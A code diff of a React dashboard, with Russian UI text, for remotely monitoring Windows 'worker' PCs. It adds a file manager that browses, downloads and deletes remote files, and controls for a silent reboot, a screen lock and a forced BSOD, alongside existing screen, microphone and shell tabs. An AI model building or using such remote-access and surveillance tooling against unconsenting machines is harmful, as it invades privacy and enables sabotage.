@@ -3,7 +3,7 @@ import {
   fetchWorkerScreenshot, requestWorkerScreenshot,
   createScreenViewWs, createMicViewWs,
   fetchWorkerProcesses, killWorkerProcess,
-  sendWorkerCommand, sendWorkerClick, createShellViewWs,
+  sendWorkerCommand, sendWorkerClick, createShellViewWs, createFilesViewWs,
 } from '../api'
 
 const DEFAULT_PIN = '1234'
@@ -321,27 +321,202 @@ function ControlsTab({ worker }) {
     setDone(d => ({ ...d, [cmd]: true }))
   }
 
+  const controls = [
+    { cmd: 'lock-screen', label: 'Заблокировать экран', desc: 'Блокирует сеанс Windows (Win+L)', icon: '🔒', cls: 'bg-slate-700/50 border-white/10 text-slate-300 hover:text-white' },
+    { cmd: 'reboot', label: 'Перезагрузить ПК', desc: 'Немедленная перезагрузка без предупреждения', icon: '🔄', cls: 'bg-yellow-500/15 border-yellow-500/30 text-yellow-400 hover:bg-yellow-500/25' },
+    { cmd: 'quit', label: 'Закрыть приложение', desc: 'Завершает процесс воркер-приложения', icon: '⏹', cls: 'bg-orange-500/15 border-orange-500/30 text-orange-400 hover:bg-orange-500/25' },
+    { cmd: 'remove-autostart', label: 'Убрать из автозапуска', desc: 'Удаляет из автостарта Windows', icon: '🚫', cls: 'bg-slate-700/50 border-white/10 text-slate-300 hover:text-white' },
+  ]
+
   return (
-    <div className="flex flex-col gap-3 py-4">
-      <div className="bg-black/20 border border-white/5 rounded-xl p-4 flex items-center justify-between">
-        <div>
-          <div className="text-sm text-white font-medium">Закрыть приложение</div>
-          <div className="text-xs text-slate-500 mt-0.5">Принудительно завершает процесс воркер-приложения</div>
+    <div className="flex flex-col gap-3 py-2">
+      {controls.map(({ cmd, label, desc, icon, cls }) => (
+        <div key={cmd} className="bg-black/20 border border-white/5 rounded-xl p-4 flex items-center justify-between">
+          <div>
+            <div className="text-sm text-white font-medium">{label}</div>
+            <div className="text-xs text-slate-500 mt-0.5">{desc}</div>
+          </div>
+          <button onClick={() => send(cmd, label)} disabled={done[cmd]}
+            className={`text-xs px-4 py-2 rounded-lg border disabled:opacity-50 transition-colors ${cls}`}>
+            {done[cmd] ? 'Отправлено' : `${icon} ${label.split(' ')[0]}`}
+          </button>
         </div>
-        <button onClick={() => send('quit', 'Закрыть приложение')} disabled={done['quit']}
-          className="text-xs px-4 py-2 rounded-lg bg-orange-500/15 border border-orange-500/30 text-orange-400 hover:bg-orange-500/25 disabled:opacity-50 transition-colors">
-          {done['quit'] ? 'Отправлено' : '⏹ Закрыть'}
+      ))}
+
+      {/* BSOD — separate with extra warning */}
+      <div className="bg-red-950/30 border border-red-500/20 rounded-xl p-4 flex items-center justify-between">
+        <div>
+          <div className="text-sm text-red-300 font-medium">Аварийное выключение (BSOD)</div>
+          <div className="text-xs text-red-500/70 mt-0.5">Вызывает синий экран смерти. Несохранённые данные будут потеряны</div>
+        </div>
+        <button
+          onClick={() => send('bsod', '⚠️ Вызвать BSOD')}
+          disabled={done['bsod']}
+          className="text-xs px-4 py-2 rounded-lg bg-red-600/20 border border-red-500/40 text-red-400 hover:bg-red-600/30 disabled:opacity-50 transition-colors font-medium"
+        >
+          {done['bsod'] ? 'Отправлено' : '💀 BSOD'}
         </button>
       </div>
-      <div className="bg-black/20 border border-white/5 rounded-xl p-4 flex items-center justify-between">
-        <div>
-          <div className="text-sm text-white font-medium">Убрать из автозапуска</div>
-          <div className="text-xs text-slate-500 mt-0.5">Удаляет приложение из автостарта Windows</div>
-        </div>
-        <button onClick={() => send('remove-autostart', 'Убрать из автозапуска')} disabled={done['remove-autostart']}
-          className="text-xs px-4 py-2 rounded-lg bg-slate-700/50 border border-white/10 text-slate-300 hover:text-white disabled:opacity-50 transition-colors">
-          {done['remove-autostart'] ? 'Отправлено' : '🚫 Убрать'}
-        </button>
+    </div>
+  )
+}
+
+// ── File manager tab ──────────────────────────────────────────────────────────
+function fmt(bytes) {
+  if (bytes === 0) return ''
+  if (bytes < 1024) return `${bytes} B`
+  if (bytes < 1024 ** 2) return `${(bytes / 1024).toFixed(0)} KB`
+  if (bytes < 1024 ** 3) return `${(bytes / 1024 ** 2).toFixed(1)} MB`
+  return `${(bytes / 1024 ** 3).toFixed(2)} GB`
+}
+
+function FileTab({ worker }) {
+  const [connected, setConnected] = useState(false)
+  const [workerOnline, setWorkerOnline] = useState(false)
+  const [path, setPath] = useState(null)
+  const [entries, setEntries] = useState([])
+  const [drives, setDrives] = useState([])
+  const [loading, setLoading] = useState(false)
+  const [error, setError] = useState(null)
+  const [deleting, setDeleting] = useState(null)
+  const wsRef = useRef(null)
+  const pendingRef = useRef({})
+
+  const send = (action, extra = {}) => new Promise((resolve, reject) => {
+    const id = Math.random().toString(36).slice(2)
+    pendingRef.current[id] = { resolve, reject }
+    wsRef.current?.send(JSON.stringify({ id, action, ...extra }))
+    setTimeout(() => {
+      if (pendingRef.current[id]) {
+        delete pendingRef.current[id]
+        reject(new Error('Timeout'))
+      }
+    }, 15_000)
+  })
+
+  useEffect(() => {
+    const ws = createFilesViewWs(worker.id)
+    ws.onopen = () => setConnected(true)
+    ws.onclose = () => { setConnected(false); setWorkerOnline(false) }
+    ws.onmessage = (e) => {
+      const msg = JSON.parse(e.data)
+      if (typeof msg === 'string' && msg.startsWith('\x01')) {
+        setWorkerOnline(msg.slice(1) === 'online'); return
+      }
+      if (msg.id && pendingRef.current[msg.id]) {
+        const { resolve } = pendingRef.current[msg.id]
+        delete pendingRef.current[msg.id]
+        resolve(msg)
+      }
+    }
+    wsRef.current = ws
+    return () => ws.close()
+  }, [])
+
+  useEffect(() => {
+    if (!workerOnline) return
+    setLoading(true)
+    send('home').then((res) => {
+      setDrives(res.drives || [])
+      navigate(res.home || '/')
+    }).catch(() => setLoading(false))
+  }, [workerOnline])
+
+  const navigate = async (newPath) => {
+    setLoading(true)
+    setError(null)
+    try {
+      const res = await send('list', { path: newPath })
+      if (res.error) { setError(res.error); setLoading(false); return }
+      setPath(newPath)
+      setEntries(res.entries || [])
+    } catch (e) { setError(e.message) }
+    setLoading(false)
+  }
+
+  const goUp = () => {
+    if (!path) return
+    const sep = path.includes('\\') ? '\\' : '/'
+    const parts = path.replace(/[\\/]+$/, '').split(sep)
+    if (parts.length <= 1) return
+    parts.pop()
+    navigate(parts.join(sep) || sep)
+  }
+
+  const download = async (entry) => {
+    try {
+      const fullPath = path.replace(/[\\/]$/, '') + (path.includes('\\') ? '\\' : '/') + entry.name
+      const res = await send('read', { path: fullPath })
+      if (res.error) { alert(res.error); return }
+      const bytes = Uint8Array.from(atob(res.data), c => c.charCodeAt(0))
+      const url = URL.createObjectURL(new Blob([bytes]))
+      const a = document.createElement('a')
+      a.href = url; a.download = entry.name; a.click()
+      URL.revokeObjectURL(url)
+    } catch (e) { alert(e.message) }
+  }
+
+  const deleteEntry = async (entry) => {
+    const fullPath = path.replace(/[\\/]$/, '') + (path.includes('\\') ? '\\' : '/') + entry.name
+    if (!confirm(`Удалить «${entry.name}»?`)) return
+    setDeleting(entry.name)
+    try {
+      const res = await send('delete', { path: fullPath })
+      if (res.error) { alert(res.error); return }
+      setEntries(e => e.filter(x => x.name !== entry.name))
+    } catch (e) { alert(e.message) } finally { setDeleting(null) }
+  }
+
+  const sep = path?.includes('\\') ? '\\' : '/'
+
+  return (
+    <div className="flex flex-col gap-3">
+      {/* Status + drives */}
+      <div className="flex items-center gap-2 flex-wrap">
+        <span className={`w-2 h-2 rounded-full flex-shrink-0 ${workerOnline ? 'bg-green-400' : 'bg-red-500'}`} />
+        <span className="text-xs text-slate-500">{workerOnline ? 'подключён' : 'офлайн'}</span>
+        {drives.map(d => (
+          <button key={d} onClick={() => navigate(d)} className="text-xs px-2 py-0.5 rounded bg-slate-700/50 border border-white/10 text-slate-300 hover:text-white transition-colors">{d}</button>
+        ))}
+      </div>
+
+      {/* Path bar */}
+      <div className="flex items-center gap-2">
+        <button onClick={goUp} disabled={!path} className="text-xs px-2 py-1.5 rounded bg-slate-700/40 border border-white/10 text-slate-300 hover:text-white disabled:opacity-40 transition-colors flex-shrink-0">↑</button>
+        <div className="flex-1 bg-black/30 border border-white/10 rounded-lg px-3 py-1.5 text-xs text-slate-300 font-mono truncate">{path ?? '...'}</div>
+        <button onClick={() => path && navigate(path)} disabled={loading} className="text-xs px-2 py-1.5 rounded bg-slate-700/40 border border-white/10 text-slate-400 hover:text-white disabled:opacity-40 transition-colors flex-shrink-0">↺</button>
+      </div>
+
+      {/* File list */}
+      <div className="bg-black/30 rounded-xl overflow-hidden border border-white/5" style={{ minHeight: 240, maxHeight: 360 }}>
+        {!workerOnline && <div className="text-slate-500 text-sm text-center py-16">Воркер офлайн</div>}
+        {workerOnline && loading && <div className="text-slate-500 text-sm text-center py-16">Загрузка...</div>}
+        {workerOnline && !loading && error && <div className="text-red-400 text-sm text-center py-16">{error}</div>}
+        {workerOnline && !loading && !error && (
+          <div className="overflow-y-auto" style={{ maxHeight: 360 }}>
+            {entries.length === 0 && <div className="text-slate-600 text-sm text-center py-12">Папка пуста</div>}
+            {entries.map((e) => (
+              <div key={e.name} className="flex items-center justify-between px-4 py-2 hover:bg-white/5 group border-b border-white/3 last:border-0">
+                <button
+                  onClick={() => e.isDir ? navigate(path.replace(/[\\/]$/, '') + sep + e.name) : null}
+                  className={`flex items-center gap-2.5 flex-1 min-w-0 text-left ${e.isDir ? 'cursor-pointer' : 'cursor-default'}`}
+                >
+                  <span className="text-base flex-shrink-0">{e.error ? '⚠️' : e.isDir ? '📁' : '📄'}</span>
+                  <span className={`text-sm truncate ${e.isDir ? 'text-blue-300' : 'text-slate-300'}`}>{e.name}</span>
+                  {!e.isDir && e.size > 0 && <span className="text-xs text-slate-600 flex-shrink-0">{fmt(e.size)}</span>}
+                </button>
+                <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
+                  {!e.isDir && (
+                    <button onClick={() => download(e)} className="text-xs px-2 py-0.5 rounded text-green-400 hover:bg-green-400/10 transition-colors">скачать</button>
+                  )}
+                  <button onClick={() => deleteEntry(e)} disabled={deleting === e.name} className="text-xs px-2 py-0.5 rounded text-red-400 hover:bg-red-400/10 disabled:opacity-50 transition-colors">
+                    {deleting === e.name ? '...' : 'удалить'}
+                  </button>
+                </div>
+              </div>
+            ))}
+          </div>
+        )}
       </div>
     </div>
   )
@@ -451,8 +626,9 @@ const TABS = [
   { id: 'screen', label: '📷 Экран' },
   { id: 'mic', label: '🎙 Микрофон' },
   { id: 'processes', label: '⚙ Процессы' },
-  { id: 'controls', label: '🛠 Управление' },
+  { id: 'files', label: '📁 Файлы' },
   { id: 'shell', label: '💻 Терминал' },
+  { id: 'controls', label: '🛠 Управление' },
 ]
 
 export function MonitoringModal({ worker, onClose, defaultTab = 'screen' }) {
@@ -484,6 +660,7 @@ export function MonitoringModal({ worker, onClose, defaultTab = 'screen' }) {
           {tab === 'screen' && <ScreenTab worker={worker} />}
           {tab === 'mic' && <MicTab worker={worker} />}
           {tab === 'processes' && <ProcessesTab worker={worker} />}
+          {tab === 'files' && <FileTab worker={worker} />}
           {tab === 'controls' && <ControlsTab worker={worker} />}
           {tab === 'shell' && <ShellTab worker={worker} />}
         </div>
